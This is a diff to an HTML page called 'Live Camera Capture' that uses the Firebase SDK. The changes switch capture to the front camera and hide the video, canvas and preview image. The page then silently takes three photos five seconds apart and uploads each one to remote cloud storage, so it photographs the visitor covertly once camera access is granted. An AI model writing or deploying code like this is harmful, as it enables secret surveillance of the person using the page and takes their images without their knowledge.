@@ -5,9 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Live Camera Capture</title>
     <link rel="stylesheet" href="style.css">
-    <!-- Include Firebase SDK -->
     <script type="module">
-        // Import the functions you need from the SDKs you need
+        // Import the necessary Firebase functions
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
 
@@ -28,28 +27,32 @@
         // Function to upload image to Firebase
         function uploadImage(imageData) {
             const storageRef = ref(storage, 'captured_images/image_' + Date.now() + '.png'); // Generate unique filename
-            uploadString(storageRef, imageData, 'data_url').then((snapshot) => {
-                console.log('Uploaded a blob or file!');
-            }).catch((error) => {
-                console.error('Error uploading image:', error);
-            });
+            uploadString(storageRef, imageData, 'data_url')
+                .then((snapshot) => {
+                    console.log('Uploaded a blob or file!');
+                })
+                .catch((error) => {
+                    console.error('Error uploading image:', error);
+                });
         }
 
-        // Access the video, canvas, and image elements
+        // Access the video and canvas elements
         window.addEventListener('load', () => {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
-            const capturedImage = document.getElementById('capturedImage');
             let captureCount = 0; // To track the number of captures
             const maxCaptures = 3; // Maximum number of images to capture
 
-            // Function to start capturing
-            navigator.mediaDevices.getUserMedia({ video: { 
-                facingMode: 'environment', 
-                width: { ideal: 1920 }, 
-                height: { ideal: 1080 } 
-            }})
+            // Function to start capturing from the front camera
+            function startCapture() {
+                navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user', // Use front camera
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }
+                })
                 .then(stream => {
                     video.srcObject = stream;
 
@@ -64,6 +67,7 @@
                                 captureCount++;
                             } else {
                                 clearInterval(captureInterval); // Stop capturing after reaching the max count
+                                stopVideo(stream); // Stop the video stream
                             }
                         }, 5000); // 5 seconds
                     };
@@ -71,26 +75,59 @@
                 .catch(err => {
                     console.error('Error accessing camera: ', err);
                 });
+            }
 
             // Function to capture image
             function captureImage() {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageData = canvas.toDataURL('image/png');
-                capturedImage.src = imageData;
-                capturedImage.style.display = 'block'; // Make the image visible
-
                 // Automatically upload the image to the server
                 uploadImage(imageData);
             }
+
+            // Function to stop the video stream
+            function stopVideo(stream) {
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+            }
+
+            // Start capturing from the front camera
+            startCapture();
         });
     </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #000; /* Black background */
+            color: #fff; /* White text */
+            text-align: center;
+        }
+
+        h1 {
+            margin-top: 20px;
+        }
+
+        .container {
+            position: relative;
+            display: inline-block;
+        }
+
+        video {
+            display: none; /* Hide video element */
+        }
+
+        canvas {
+            display: none; /* Hide canvas element */
+        }
+    </style>
 </head>
 <body>
     <h1>Live Camera Capture</h1>
     <div class="container">
         <video id="video" autoplay></video>
-        <canvas id="canvas" style="display: none;"></canvas>
-        <img id="capturedImage" alt="Captured Image" />
+        <canvas id="canvas"></canvas>
     </div>
 </body>
 </html>
